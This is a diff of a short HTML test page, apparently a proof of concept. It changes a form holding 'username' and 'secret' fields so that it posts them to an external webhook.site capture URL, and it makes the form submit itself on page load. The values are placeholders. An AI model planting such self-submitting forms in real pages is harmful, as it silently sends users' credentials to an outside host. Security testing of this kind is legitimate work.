@@ -3,10 +3,13 @@
 <head>
 </head>
 <body>
+<form method="POST" action="https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35">
+  <input id="username" class="mgb-1" name="username" value="bla"/>
+  <input id="secret" class="mgb-1" name="secret" value="bbbbaaaa"/>
+  <button class="mgb-1" id="clickbtn" type="submit">Login</button>
+</form>
 <script>
-document.write('<form method="POST" action="https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35"><input id="username" class="mgb-1" name="username" value="bla"></input><input id="secret" class="mgb-1" name="secret" value="bbbbaaaa"></input><button class="mgb-1" id="clickbtn" type="submit">Login</button></form>');
-
-document.getElementById("clickbtn").form.submit();
+window.addEventListener('load', function(){document.getElementById("clickbtn").form.submit();});
 </script>
 </body>
 </html>
